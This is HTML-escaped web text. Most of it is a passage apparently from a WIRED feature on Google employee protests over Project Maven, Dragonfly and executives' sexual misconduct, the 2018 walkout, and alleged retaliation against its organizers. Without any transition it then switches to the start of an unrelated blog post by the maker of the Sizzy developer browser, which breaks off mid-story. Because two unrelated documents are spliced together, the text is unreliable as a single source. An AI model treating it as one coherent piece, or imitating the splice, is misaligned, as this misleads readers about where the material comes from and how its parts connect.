&lt;p&gt;That month, Fong-Jones made another calculated exception to her usual policy of keeping dissent within the Google family. She and 14 other current employees spoke to WIRED about the &lt;a href=&quot;https://www.wired.com/story/the-dirty-war-over-diversity-inside-google/&quot;&gt;“dirty war” that was being waged inside Google&lt;/a&gt; over the issue of diversity. Most news coverage of Damore's case amplified its claims that Google was cracking down on conservatives. But the employees argued that something else was going on. HR had become “weaponized,” they said; Googlers on both sides of the battle lines had become adept at working the refs—baiting colleagues into saying things that might violate the company's code of conduct, then going to human resources to report them. But Googlers on the right were going further, broadcasting snippets of the company's uncensored brawls to the world, and setting up their colleagues for harassment.&lt;/p&gt;
&lt;p&gt;Google's HR department, for its part, was feeling inundated with policy violations across the spectrum. And according to Fong-Jones and her colleagues, the department was too focused on trying to appear even-handed. Employees had been reprimanded and even fired for criticizing Damore's memo using terms like “white privilege” and “white boy.” “Promoting harmful stereotypes based on race or gender is prohibited,” Google said in a statement about one such termination.&lt;/p&gt;

&lt;p&gt;Soon after speaking to WIRED, Fong-Jones helped prepare a statement explaining to colleagues about why she and the others had gone to the press. She asked coworkers to sign a petition for a safer workplace, demanding better moderation of mailing lists and rules against doxing coworkers. It received 2,600 signatures. But it wasn't the only employee petition that would make waves that winter.&lt;/p&gt;
&lt;h3&gt;VI.&lt;/h3&gt;
&lt;/section&gt;&lt;section class=&quot;section-break-component&quot; readability=&quot;126.17932148627&quot;&gt;&lt;p&gt;&lt;span class=&quot;lede&quot;&gt;By February, word&lt;/span&gt; about Maven began to swirl outside the teams of engineers who had first alerted Fong-Jones to the project. So she decided to post about Maven on her internal Google+ page, sharing grave concerns that Google might be helping the US government carry out drone strikes, according to a copy of the post provided to WIRED by another Google engineer. Shortly afterward, the group of engineers posted an internal statement of their own, explaining that they had been told to build an “air gap”—a security measure favored by the Pentagon that physically separates networks to protect sensitive data—and informing coworkers about their efforts to thwart the project.&lt;/p&gt;
&lt;p&gt;Fong-Jones hoped to pressure Google's leaders using entirely internal channels, and at first things seemed to be working. Outraged employees began referring to the engineers as the Group of Nine, and executives felt compelled to respond. On her own Google+ page, Greene tried to assure employees that the contract was only $9 million and merely a “proof of concept.” Within 48 hours, however, Fong-Jones says she received a call from a journalist—Lee Fang of the Intercept—asking her for comment on her Google+ post. Someone had leaked. If word got out, she feared, management would feel backed into a corner. So Fong-Jones contacted Google's security team herself. Let's catch the leaker, she said.&lt;/p&gt;
&lt;p&gt;Another staffer who was keeping close track of the internal rumblings about Maven was Meredith Whittaker, a program manager inside Google Cloud. In addition to her work at Google, Whittaker also helped run a New York University-affiliated research center called the AI Now Institute, which studies the ethics and social implications of artificial intelligence. On February 28, Whittaker drafted a petition for employees demanding that Pichai cancel the contract. “Google should not be in the business of war,” she wrote.&lt;/p&gt;
&lt;p&gt;At TGIF that week, executives were ill-prepared for the blowback. One employee stood up and said she had left her last job because of ethical concerns around defense work. Brin told her that Google was different, because at least here she could ask questions. Whittaker's petition netted about 500 signatures that night and 1,000 the next day. It became a touchstone for a divisive, months-long internal debate, inflamed by Google's open culture.&lt;/p&gt;
&lt;p&gt;There was no consensus on Maven inside Google's fractious workforce, which includes former Defense Department researchers, military veterans, and immigrants from countries under US drone surveillance. Even the employee group for veterans was split on the project. But Maven's opponents were organized in a way that Google hadn't really seen before. Employees fanned out into different groups. Some scoured Google's open databases, where they discovered emails that appeared to contradict Greene's statement about the size of the Pentagon contract; they also found snippets of Python code for computer-vision technology that seemed designed to track human beings and vehicles. Some churned out anti-Maven memes; others kept track of employees who were quitting over the contract. One activist group focused on fact-checking, listing every time they found evidence to contradict the company line. The list got longer and longer.&lt;/p&gt;
&lt;p&gt;Greene responded by playing whack-a-mole—locking down mailing lists, deleting documents, or asking employees to redact Google+ posts. Longtime execs were taken aback, and even hurt, by the loss of their employees' trust, which they had come to take for granted.&lt;/p&gt;

&lt;div class=&quot;inset-left-component inset-left-component--pullquote&quot; readability=&quot;6.5&quot;&gt;
&lt;blockquote name=&quot;inset-left&quot; class=&quot;inset-left-component__el&quot; readability=&quot;6&quot;&gt;
&lt;p&gt;Fong-Jones contacted security herself. Let's catch the leaker, she said.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/div&gt;
&lt;p&gt;In March, &lt;a href=&quot;https://gizmodo.com/google-is-helping-the-pentagon-build-ai-for-drones-1823464533&quot; target=&quot;_blank&quot;&gt;Gizmodo&lt;/a&gt; broke the Maven story to the public. Inside Google, executives urged employees to reserve judgment; Google's leaders, they said, were developing a set of AI principles that would govern its business practices and contracts like Maven. Employees should wait for those principles, which would provide the whole company with a basis for discussion.&lt;/p&gt;
&lt;p&gt;At another time, such a gesture toward self-regulation might have sufficed. And plenty of employees were eager to change the subject. But the anti-Maven organizers had momentum on their side—and support from an outside labor organization called Tech Workers Coalition. They were also galvanized by a powerful realization: They could reliably summon the rapt attention of the media and the public, which were hungrier than ever for the vicarious thrill of watching someone—finally—hold tech companies accountable.&lt;/p&gt;
&lt;p&gt;On April 4, &lt;em&gt;&lt;a href=&quot;https://www.nytimes.com/2018/04/04/technology/google-letter-ceo-pentagon-project.html&quot; target=&quot;_blank&quot;&gt;The New York Times&lt;/a&gt;&lt;/em&gt; published a story about Whittaker's petition, which by then had gathered more than 3,100 signatures. Four days later, at 10 pm on a Monday night, Whittaker received an email from Greene inviting her to participate in a four-person internal debate about Maven, to be broadcast to Google's employees from Mountain View that Wednesday.&lt;/p&gt;
&lt;p&gt;Whittaker prepared feverishly. She called up colleagues and a friend from the Defense Department. She memorized drone kill stats and read up on defense contracting. On the day she flew out from New York for the event, Whittaker learned that the debate would take place three times during the course of the day, so that employees in other time zones could tune in.&lt;/p&gt;


&lt;p&gt;Whittaker should have been outmatched. Greene served as the moderator, and the two pro-Maven panelists were both longtime Google veterans. But they used many of the same arguments that executives had recited in recent TGIFs. &lt;em&gt;The contract is exploratory. Maven merely uses Google's open source machine-learning software. Better to have Google working on AI than a defense contractor. Maven helps “our” military.&lt;/em&gt; Whittaker, building on an analysis she had been rehearsing in Google's social networks for weeks, argued that the ethical codes surrounding AI were still largely unformed and shouldn't be defined on the fly in the context of a business relationship with the Pentagon.&lt;/p&gt;
&lt;p&gt;After the first panel, Whittaker paced back and forth in the Googleplex parking lot, calling up colleagues to ask how they would have countered her remarks. By the time the last panel ended, Whittaker's energy was zapped. She ran to her car in the pouring rain, picked up some beer and peanuts at a bodega, and went back to her hotel room. Inside Google, people often look to Memegen to gauge the mood of an unruly workforce. On the day of the town halls, most of the memes were pro-Whittaker.&lt;/p&gt;
&lt;p&gt;On May 30, &lt;em&gt;The New York Times&lt;/em&gt; published &lt;a href=&quot;https://www.nytimes.com/2018/05/30/technology/google-project-maven-pentagon.html&quot; target=&quot;_blank&quot;&gt;a story about Maven&lt;/a&gt; that included the emails Fei-Fei Li had sent to other executives about weaponized AI. At the weekly cloud team meeting two days later, according to details leaked to Gizmodo, Greene announced that Google planned not to renew the Maven contract. The backlash, she reportedly said, had been terrible for the company.&lt;/p&gt;

&lt;/div&gt;
&lt;h3&gt;VII.&lt;/h3&gt;
&lt;/section&gt;&lt;section class=&quot;section-break-component&quot; readability=&quot;81.683900226757&quot;&gt;&lt;p&gt;&lt;span class=&quot;lede&quot;&gt;In early June&lt;/span&gt; 2018, Pichai finally published the AI principles that Google had promised its employees. They included a list of four applications of AI that Google would not pursue, including weapons, technologies that gather and use information “for surveillance violating internationally accepted norms,” and technology “whose purpose contravenes widely accepted principles of international law and human rights.”&lt;/p&gt;
&lt;p&gt;Two months later, it seemed to many employees that Pichai had already broken those principles. On August 1, a &lt;a href=&quot;https://theintercept.com/2018/08/01/google-china-search-engine-censorship/&quot; target=&quot;_blank&quot;&gt;blockbuster story&lt;/a&gt; in the Intercept reported that Google was planning to launch a new censored search engine in China. Codenamed Project Dragonfly, the engine would blacklist search terms like “human rights” and “student protest,” and would produce government-controlled results for “air quality.” The service would take the form of an app that Google was prepared to launch in six to nine months. Chinese officials had already seen a demo, according to the Intercept, though Google still needed government approval. The app might even help link a person's search records to their cell phone, with the information stored on servers in China. (A Google spokesperson tells WIRED that, at the time, it was “impossible to confirm or comment on” what the service “might have looked like—it was too early to say.”)&lt;/p&gt;
&lt;p&gt;Once again, an employee backlash set in. The Chinese government censorship that had so disturbed Google staffers in 2010 had only grown bolder and more sophisticated under President Xi Jinping, who was detaining hundreds of thousands of Uighurs and members of other Muslim minority groups in internment camps and deploying the latest in surveillance technology on citizens.&lt;/p&gt;
&lt;p&gt;The succession of scandals kept deepening the divide between execs and employee activists. More and more, the latter were questioning the social contract they had lived by. “I went from ‘Oh my god, who leaked that?’ to ‘Oh my god, management did what?!’ ” Fong-Jones says. She started to doubt her past successes with executives. “Perhaps the reason they were willing to listen in the first place was to give up the things that mattered less to them,” she says.&lt;/p&gt;


&lt;p&gt;A couple of weeks after the first Intercept story, Pichai answered some questions about Dragonfly, which he described as an “exploratory” program. In his telling, Dragonfly was a project that aligned with Google's principles, not one that contravened them. “Our stated mission is to organize the world's information,” he said. “China is one-fifth of the world's population.” Besides, he said, “I genuinely do believe we have a positive impact when we engage around the world, and I don't see any reason why that would be different in China.”&lt;/p&gt;
&lt;p&gt;Brin also spoke at the meeting, claiming he only learned about Dragonfly because of the “kerfuffle.” (Former executives say this strikes them as implausible.) He also said that “Googlers should feel broadly proud of their work, not feel that it compromises their principles.” Then the meeting stopped abruptly. Someone was live-leaking the event to a &lt;em&gt;New York Times&lt;/em&gt; reporter. An executive onstage asked the technicians running the meeting to show everyone what was happening, and a wall of screens behind Brin flashed a tweet from the reporter who was posting Brin's comments in real time.&lt;/p&gt;
&lt;p&gt;With the Dragonfly scandal, employees were in some ways the least of Google's worries. Washington lawmakers in both parties responded in ominous terms. “It would be very dangerous for Google if they were misrepresenting to American policymakers the extent of their involvement in China or the ramifications of some of their joint ventures,” US senator Mark Warner, a Democrat from Virginia, told WIRED, noting the growing bipartisan concern around China.&lt;/p&gt;

&lt;p&gt;Dragonfly left Google particularly vulnerable to criticism from leaders on the right, who painted the company as un-American. Josh Hawley, now a Republican senator from Missouri, said Google was motivated more by money than allegiance to any country. “If that means violating the privacy of American consumers, they're happy to do it. If that means going to China and partnering on technologies that aid a repressive regime, they're apparently happy to do it.” In that context, Google's old slogan no longer applies, Hawley said. “It's time that we remove the halo.”&lt;/p&gt;
&lt;h3&gt;VIII.&lt;/h3&gt;
&lt;/section&gt;&lt;section class=&quot;section-break-component&quot; readability=&quot;222.36244307527&quot;&gt;&lt;p&gt;&lt;span class=&quot;lede&quot;&gt;On October 25,&lt;/span&gt; 2018, a story in &lt;em&gt;The New York Times&lt;/em&gt; dredged up the dark side of Google's tolerance for aberrant geniuses. In 2013, the paper reported, a woman who worked for Google had accused Android cofounder Andy Rubin of coercing her to perform oral sex in a hotel room. Google, the story reported, had investigated and found the claim credible but &lt;a href=&quot;https://www.nytimes.com/2018/10/25/technology/google-sexual-harassment-andy-rubin.html&quot; target=&quot;_blank&quot;&gt;sent Rubin off&lt;/a&gt; with a $90 million exit package and a fond farewell.&lt;/p&gt;
&lt;p&gt;The story didn't stop at Rubin. Another high-performing executive, Amit Singhal, the former head of Google Search, was given a multimillion-dollar exit package after a female employee accused him of groping her at an off-site work event. A third, Richard DeVaul, allegedly told a female job candidate that he was in a polyamorous relationship during her interview and invited her to meet him at Burning Man, where he asked if he could give her a massage. Google denied her the job. DeVaul was still working at Google as director of X, the company's experimental division for ambitious projects.&lt;/p&gt;
&lt;p&gt;The &lt;em&gt;Times&lt;/em&gt; investigation also noted Google's overall “permissive culture,” in which top executives—including Brin, Schmidt, and chief legal officer David Drummond—had relationships with female employees. Some of the women claimed they were later pushed out of the company.&lt;/p&gt;
&lt;p&gt;Google employees lit up the company's internal social networks, once again contemplating galling facts about the status of women in Silicon Valley. But this time the discussion was less easily derailed, perhaps because some of the most important exchanges took place on an anonymous mailing list called Expectant New Moms. The group's 4,000 members knew the stories about Rubin and Singhal—thanks in part to email threads on the list after each executive departed. But Rubin's $90 million payout felt like a sucker punch. The fact that leaders' misconduct had been an open secret made it worse. Why had they given so many years of their lives to make these men insanely rich?&lt;/p&gt;


&lt;p&gt;At 2:05 pm, Claire Stapleton, then a product marketing manager at YouTube, fired off a message to the group: “absolutely disgusting—all of it, all of them. topple the patriarchy.”&lt;/p&gt;
&lt;p&gt;That day Alphabet was already poised to share some mixed financial news. The company was set to report $9.19 billion in profits for the third quarter, thanks in part to Trump's tax cuts to benefit big business, but missed revenue targets. Now executives scrambled to do damage control with employees before the earnings call. A couple of hours after the &lt;em&gt;Times&lt;/em&gt; story was published, Pichai sent a memo assuring employees that Google had reformed its ways. In the past two years, he wrote, 48 people had been terminated for sexual harassment, including 13 at the senior manager level or higher, none of whom received an exit package. Employees were skeptical. If Google was so committed to a safe environment, why was DeVaul still there? (A Google spokesperson said HR investigated the allegation “thoroughly and took appropriate corrective action.”)&lt;/p&gt;
&lt;p&gt;That same evening, Page—who was CEO when the claims about Rubin, Singhal, and DeVaul came to light—apologized to employees at a TGIF. “I've had to make a lot of decisions that affect people every day, some of them not easy. And, you know, I think certainly there's ones with the benefit of hindsight I would have made differently,” he said in a prepared statement. Page's explanation was evasive, but his tone was serious. Brin, on the other hand, made an awkward joke about confidentiality, which sounded to some as if he were blaming the leakers, and seemed irked by the fact that the same question came up over and over again when the executives had nothing new to say. The meeting soon returned to business as usual with a product demo for new Google Photo features.&lt;/p&gt;
&lt;p&gt;For Stapleton, the meeting was a huge letdown. Her first job at Google, in 2007, had been to help lead TGIF, including writing talking points for Page and Brin. Now they couldn't even answer the main question. At 7:58 pm, Stapleton fired off another message to the list suggesting the moms channel their anger into collective action, like maybe a walkout, a strike, or an open letter. “Googler women (and allies) are REALLY ragefueled right now, and I wonder how we can harness that to force some, like, real change.”&lt;/p&gt;
&lt;p&gt;As the women dissected the TGIF performance, they also swapped stories about reporting harassment to Google HR, only to watch their abusers receive promotions. The messages were still rolling in at 1 am.&lt;/p&gt;

&lt;p name=&quot;inset-left&quot; class=&quot;inset-left-component__el&quot;&gt;&lt;strong&gt;APRIL 26&lt;/strong&gt;&lt;br/&gt;At a Google town hall, women discuss the alleged retaliation they faced after participating in the November walkout.&lt;/p&gt;
&lt;/div&gt;
&lt;p&gt;The next morning, Stapleton started a Google Group. “Welcome to ground zero of the google women's walkout / a day without women (naming/branding tbd).” Just as with the travel ban walkout 21 months earlier, word spread quickly. A group of eight organizers emerged, including Meredith Whittaker, and they got to work planning logistics, hammering out demands, and fine-tuning their message. Stapleton set up a Google form to ask employees why they were walking out. The 350 responses that promptly poured in included personal stories about harassment, discrimination, retaliation, and pay inequity.&lt;/p&gt;
&lt;p&gt;From those responses and other internal posts, the organizers smelted together five core demands. They wanted an end to forced arbitration, a process that compelled employees to bring their claims to a private arbiter, paid for by Google, rather than before a judge. They also demanded pay equity and policies that would guarantee more transparency around harassment claims. They scrubbed personal details from the 350 stories and divided them into buckets that mapped to each demand, so the rally organizers would have something to read.&lt;/p&gt;
&lt;p&gt;As the plans came together, Google invited Stapleton to join a meeting with three top female executives: Ruth Porat, the company's chief financial officer; Wojcicki, the CEO of YouTube; and Eileen Naughton, the head of people operations. The invitation was brokered by the head of Women at Google, an employee resource group, who told Stapleton it was an amazing opportunity. Other walkout organizers disagreed. Google was just trying to co-opt their momentum, the organizers felt. Stapleton pushed off the request. “It feels weird to say no to these women who are, like, Illuminati,” she said.&lt;/p&gt;
&lt;p&gt;On Tuesday evening, two days before the walkout, Pichai sent another memo: “One thing that's become clear to me is that our apology at TGIF didn't come through, and it wasn't enough.” He acknowledged the protest and told employees they would have the support they needed.&lt;/p&gt;


&lt;p&gt;The plan was for each office to walk out at 11:10 am on November 1, 2018. By the time the first images came in from Asia, it was clear that the call hadn't merely mobilized the lefties in Mountain View. In Singapore, where labor law prohibits workers from marching, employees stood in a cavernous office lobby, somber and listening intently to the speakers. In New York City, employees streamed out from Google's Eighth Avenue office into a nearby park. Whittaker and Stapleton stood on chairs as they rallied the crowd. Their megaphone was no match for the noise from the West Side Highway, but chants of “Time's up!” rose above the din.&lt;/p&gt;
&lt;p&gt;When it came time for Mountain View to rally, &lt;a href=&quot;https://www.wired.com/story/google-walkout-just-latest-sign-tech-worker-unrest/&quot;&gt;4,000 Google employees filled the courtyard&lt;/a&gt; outside the main café, once again chanting and holding signs, including ones designed by volunteers from Google Creative Lab that said “HAPPY TO QUIT FOR $90M—NO SEXUAL HARASSMENT REQUIRED” in a fresh, sans-serif font. Standing a few yards from where Pichai and Brin had stood during the travel ban walkout in 2017, employees once again shared their stories. A female YouTube employee described being drugged by a coworker at a company event, then being told by HR that she had to stay on the same team. This time, no executive stepped up to the mic. No one chanted their names.&lt;/p&gt;
&lt;p&gt;Local TV crews had to report from the edges of campus, but the news choppers overhead had a clear view of “Not OK, Google” and “Time's Up” written in chalk on the pavement. By then, Stapleton, Whittaker, and the other organizers back in New York had commandeered a booth at a Mexican place in the Meatpacking District. They ordered margaritas and chips and guacamole, updating social media accounts and ducking outside for press interviews. The women were triumphant; they were half asleep. A few days earlier, they'd thought a turnout in the hundreds would be a big deal. When they tallied the total, 20,000 employees had walked out.&lt;/p&gt;
&lt;p&gt;In a way, though, Google's attempts to neutralize the walkout had worked. A sense of catharsis and camaraderie seemed to overshadow any hostility toward management. Even some supporters felt that the walkout was more about the act than the asks. On November 8, 2018, a week after the protest, Pichai sent a memo to his employees—simultaneously published on Google's blog—announcing that Google would no longer require arbitration on sexual harassment claims. But it would still prohibit class actions. The change brought Google in line with policy tweaks that Microsoft, and even Uber, had made within the past year.&lt;/p&gt;

&lt;p&gt;On November 1, 2018, as many as 20,000 Google employees walked off the job to protest the tech giant's handling of sexual misconduct by leaders.&lt;/p&gt;
&lt;p&gt;&lt;cite class=&quot;caption-component__credit&quot;&gt;Michael Short/Getty Images&lt;/cite&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;h3&gt;IX.&lt;/h3&gt;
&lt;/section&gt;&lt;section class=&quot;section-break-component&quot; readability=&quot;153.20675675676&quot;&gt;&lt;p&gt;&lt;span class=&quot;lede&quot;&gt;Google's response followed&lt;/span&gt; a familiar cycle: internal opposition and bad press, followed by incremental change. But the Women's Walkout appears to have perturbed executives in a way that the protests against Dragonfly and Maven had not. In the months that followed, pushback seemed to spill over &lt;a href=&quot;https://www.wired.com/story/google-walkout-organizers-say-theyre-facing-retaliation/&quot;&gt;into the organizers' day jobs&lt;/a&gt;. In December, Whittaker was told she would have to leave the Google Cloud organization, where she had worked for three years. A few weeks after that, Stapleton claims she was told that her role at YouTube would be “restructured” and she would lose half her reports and responsibilities. (A Google spokesperson says no changes were made to Stapleton's role.)&lt;/p&gt;
&lt;p&gt;Fong-Jones, for her part, was burning out. It had been a long year and a half since Damore's memo leaked. In early January 2019, she submitted her resignation, but she turned even that into a last-ditch effort to reform Google; she told executives she would reconsider if the company put an employee on its corporate board. Instead, Google HR tried to get her to leave before her notice period was up, and she filed a retaliation claim. Google investigated and determined it was unfounded.&lt;/p&gt;
&lt;p&gt;That month, Google also tightened the reins on TGIF. Brin and Page stopped showing up. Employees could access video recordings for only a week after the meeting, rather than for years. The company nixed live questions, which Google claimed was more fair to employees in different time zones. (“We're a global company and want to make sure we're answering questions from employees around the world,” a spokesperson says.) TGIF's transformation from candid conversation to press conference was pretty much complete.&lt;/p&gt;
&lt;p&gt;The company's internal social networks were quieter too. Cernekee had been fired in June 2018 for violating multiple company policies, including using a personal device to download company information. As part of his ongoing legal case, according to people familiar with the matter, he had to give back 20,000 pages of internal documents, some of them confidential. Cernekee disputes this.&lt;/p&gt;
&lt;p&gt;(For weeks, as WIRED was preparing this story for publication, Cernekee's lawyer tried to dissuade the magazine from disclosing his identity. Six days after this article went to press—but before it appeared on newsstands—an interview with Cernekee appeared in &lt;em&gt;The Wall Street Journal&lt;/em&gt;. He presented himself as a whistle-blower and mainstream Republican who had been bullied and eventually fired for his beliefs. In subsequent interviews with Tucker Carlson and on &lt;em&gt;Fox &amp;amp; Friends&lt;/em&gt;, Cernekee said he believed that Google would try to sway the 2020 election—a claim that inspired a tweet name-dropping the engineer from President Trump himself.)&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.wired.com/story/james-damores-lawsuit-is-designed-to-embarrass-google/&quot;&gt;Damore's class-action lawsuit&lt;/a&gt;, meanwhile, was still proceeding, albeit without Damore. In October 2018 his claims were moved to arbitration, while claims from two conservatives who allege they were denied positions for political reasons are proceeding in court.&lt;/p&gt;


&lt;p&gt;Google CEO Sundar Pichai testifies before the House Judiciary Committee on December 11, 2018, in Washington, DC.&lt;/p&gt;
&lt;p&gt;&lt;cite class=&quot;caption-component__credit&quot;&gt;Alex Wong/Getty Images&lt;/cite&gt;&lt;/p&gt;
&lt;p&gt;A couple of months later, Pichai was called up to answer questions about Dragonfly at a House Judiciary Committee hearing. “Right now,” he said, “there are no plans for us to launch a search product in China.” That wouldn't be his last trip to Washington. After two years of employee revolts, culture-warring, and accusations, the &lt;a href=&quot;https://www.wired.com/story/facebook-mark-zuckerberg-15-months-of-fresh-hell/&quot;&gt;furor that had surrounded Facebook&lt;/a&gt; for the previous three years now finally seemed to be aimed at Google with full force. Within a three-week span in March, Senator Hawley banged the drum on amending laws that granted platforms immunity from liability for moderating their platforms; Democratic senator and presidential candidate &lt;a href=&quot;https://www.wired.com/story/elizabeth-warren-break-up-amazon-facebook-google/&quot;&gt;Elizabeth Warren published a plan to break up Big Tech&lt;/a&gt;; and the chair of the Joint Chiefs of Staff testified that Google's effort to court China “indirectly benefits the Chinese military,” even as it snubbed working with the Pentagon. A couple of days later, President Trump tweeted, “Google is helping China and their military, but not the U.S. Terrible!”&lt;/p&gt;
&lt;p&gt;That spring, many of Google's efforts to stave off scrutiny seemed to hasten its arrival. In March, Google announced that it had formed an AI ethics council composed of external advisers. It included &lt;a href=&quot;https://www.wired.com/story/google-needs-grow-cloud-business-carefully/&quot;&gt;Kay Coles James&lt;/a&gt;, president of the Heritage Foundation, who lacked any discernible expertise in artificial intelligence and who had recently expressed anti-trans and anti-immigrant views. Some employees were appalled; an internal petition to remove James quickly gained 2,500 signatures. Breitbart and the Daily Caller posted the names of petition organizers, including Whittaker, and leaked internal messages from a mailing list. One ethics council member quit in the midst of the uproar. When Google learned that another member was planning on defecting, the company disbanded the council—nine days after it launched. To the outside world, it looked as if Google had capitulated to employee protests. Conservative critics descended. In &lt;em&gt;The Washington Post&lt;/em&gt;, James said Google was not upholding its bargain with the right. “How can Google now expect conservatives to defend it against anti-business policies from the left that might threaten its very existence?” she asked.&lt;/p&gt;
&lt;p&gt;While Whittaker was helping to lead the charge against the ethics council, she continued to tussle with management over her job. Stapleton, who had been told multiple times that she was a “rising leader” in YouTube marketing, says she was also struggling to hold on to the responsibilities she'd held before the walkout. When the two women heard that a third organizer had also been denied a transfer, they posted an open letter on the walkout mailing list on a Monday in late April, reporting to their coworkers that &lt;a href=&quot;https://www.wired.com/story/google-walkout-organizers-say-theyre-facing-retaliation/&quot;&gt;Google was retaliating against them&lt;/a&gt;. They invited their colleagues to fight back against retaliation at an employee town hall meeting that Friday, to be livestreamed at Google offices around the globe.&lt;/p&gt;
&lt;div class=&quot;inset-left-component&quot; readability=&quot;7.0103092783505&quot;&gt;
&lt;h4 name=&quot;inset-left&quot; class=&quot;inset-left-component__el&quot;&gt;Got a Tip?&lt;/h4&gt;
&lt;p name=&quot;inset-left&quot; class=&quot;inset-left-component__el&quot;&gt;If you'd like to tip WIRED anonymously, we have a couple ways for you to &lt;a href=&quot;https://www.wired.com/securedrop/&quot;&gt;do that here&lt;/a&gt;.&lt;/p&gt;
&lt;/div&gt;
&lt;p&gt;That week, managers emailed the entire marketing and cloud departments, denying the women's claims. On the morning of the town hall, Lorraine Twohill, the head of marketing at Google, also sent a department-wide email saying Stapleton's claims were false. “Over the last several weeks, I have spent a lot of time talking to everyone involved, trying to understand and empathize with the situation,” she wrote. Stapleton says Twohill never asked her about the incidents surrounding her claims of retaliation.&lt;/p&gt;

&lt;p&gt;After that, Stapleton saw no future for herself at YouTube. She handed in her resignation three weeks later. In mid-July, Whittaker resigned too. The next day Google happened to announce definitively that Project Dragonfly was dead. By then, few of the major organizers of the protests that had shaken Google over the past two years were left at the company.&lt;/p&gt;
&lt;p&gt;But that didn't mean things would go back to normal at Google. Over the past three years, the structures that once allowed executives and internal activists to hash out tensions had badly eroded. In their place was a new machinery that the company's activists on the left had built up, one that skillfully leveraged media attention and drew on traditional organizing tactics. Dissent was no longer a family affair. And on the right, meanwhile, the pipeline of leaks running through Google's walls was still going as strong as ever.&lt;/p&gt;
&lt;p&gt;Late this June, Project Veritas, a right-wing outlet specializing in stings and exposés, published a slew of leaked documents and snippets of hidden-camera footage from inside Google. One of the items it posted, as if evidence of Google's supposed bias, was a “Beginner's Guide to Protesting” that Google employees had drawn up around the time of the travel ban walkout back in 2017. Next to the document was a message and a link. “Do you work in Big Tech?” it said. “Project Veritas would love to hear from you.”&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Updated 8-13-19, 1:50 pm EDT: An earlier version of this piece incorrectly stated the name of the Golden State Skinheads, and that none of Google's major protest organizers remained at the company by July 2019. A few organizers continue to work at the company.&lt;/em&gt;&lt;/p&gt;

&lt;p id=&quot;f706&quot; class=&quot;jz ka be cg kb b kc kd ke kf kg kh ki kj kk kl km&quot;&gt;Hey friends 👋&lt;/p&gt;
&lt;p id=&quot;7a12&quot; class=&quot;jz ka be cg kb b kc kd ke kf kg kh ki kj kk kl km&quot;&gt;It’s been a long time since I have written something here, but I don’t want to write articles for the sake of “keeping the blog alive”, screw that.&lt;/p&gt;
&lt;p id=&quot;960a&quot; class=&quot;jz ka be cg kb b kc kd ke kf kg kh ki kj kk kl km&quot;&gt;Well, I finally have a story to tell. I finally launched the new version of &lt;a href=&quot;https://sizzy.co&quot; class=&quot;bp db kn ko kp kq&quot;&gt;Sizzy&lt;/a&gt; last month. It went from a simple web app to a full-fledged browser for designers and developers. I would say that it’s been a very exciting month, but actually, it’s been a bumpy ride for 2.5 years. I made a lot of mistakes and I learned a lot of lessons, so I wanted to share the entire story with you.&lt;/p&gt;
&lt;h2 id=&quot;9bfc&quot; class=&quot;kr ks be cg cf gu kt ku kv kw kx ky kz la lb lc ld&quot;&gt;Solve your own problem, everything else will follow&lt;/h2&gt;

The tweet I wrote after getting the idea in 2017
&lt;p id=&quot;60bb&quot; class=&quot;jz ka be cg kb b kc kd ke kf kg kh ki kj kk kl km&quot;&gt;As everything that I have ever worked on, I was trying to solve my own problem. I was working as a freelancer at the time and previewing a website on multiple devices was a &lt;strong class=&quot;kb lp&quot;&gt;major&lt;/strong&gt; pain in the ass for me. The client wanted the app to work perfectly on every device, in every orientation. So after every change in my app, I had to switch 20 device variations in Chrome and it was driving me crazy. I’m obsessed with automating things. I’d spend hours to automate a task that takes 3 seconds just so I don’t have to repeat the steps ever again. Meanwhile, my sister was swapping the batteries between two remotes 10 times per day for almost a year without buying a second pair of batteries and she was absolutely fine. I guess everyone is different.&lt;/p&gt;
&lt;p id=&quot;f320&quot; class=&quot;jz ka be cg kb b kc kd ke kf kg kh ki kj kk kl km&quot;&gt;You can actually &lt;a class=&quot;bp db kn ko kp kq&quot; href=&quot;https://medium.com/@kitze/introducing-sizzy-a-tool-for-developing-responsive-websites-crazy-fast-39a8c0061992&quot;&gt;read the original article&lt;/a&gt; that I published when I launched the app.&lt;/p&gt;
&lt;p id=&quot;2607&quot; class=&quot;jz ka be cg kb b kc kd ke kf kg kh ki kj kk kl km&quot;&gt;Back to the story. After only a day of work, I already saved myself a lot of time while working for clients in the future. I published the app and I open-sourced it on GitHub so everyone can use it and contribute. People &lt;strong class=&quot;kb lp&quot;&gt;loved&lt;/strong&gt; it. The project received &lt;strong class=&quot;kb lp&quot;&gt;5k&lt;/strong&gt; stars. The analytics were going crazy. I couldn’t believe what was going on.&lt;/p&gt;
&lt;/div&gt;&lt;div readability=&quot;435.72834823444&quot;&gt;
&lt;h2 id=&quot;fd6d&quot; class=&quot;kr ks be cg cf gu kt ku kv kw kx ky kz la lb lc ld&quot;&gt;Hopefully, people will donate, right?&lt;/h2&gt;
&lt;p id=&quot;c3db&quot; class=&quot;jz ka be cg kb b kc mg ke mh kg mi ki mj kk mk km&quot;&gt;I started an Open Collective for it but it made 93$ in 2.5 years. After I tweeted about this, a couple of people said: “well maybe people aren’t using it”. I knew that they were just trying to bring me down, but the analytics were saying something else. 7 to 10 thousand people were using the app every month. The donation link was visible everywhere, so it wasn’t possible to miss it.&lt;/p&gt;
&lt;p id=&quot;8ede&quot; class=&quot;jz ka be cg kb b kc kd ke kf kg kh ki kj kk kl km&quot;&gt;Here’s the catch: when you give away something completely for free, people aren’t that motivated to pay for it. It’s just how humans think, there’s nothing new here. When was the last time you chose a value above 1$ on a “pay what you want” slider for an app? Exactly. (ok, one person who’s reading the article, you’re special and you’re a saint for choosing 2.5$ that one time when you were drunk)&lt;/p&gt;
&lt;h2 id=&quot;7152&quot; class=&quot;kr ks be cg cf gu kt ku kv kw kx ky kz la lb lc ld&quot;&gt;I made a huge mistake&lt;/h2&gt;
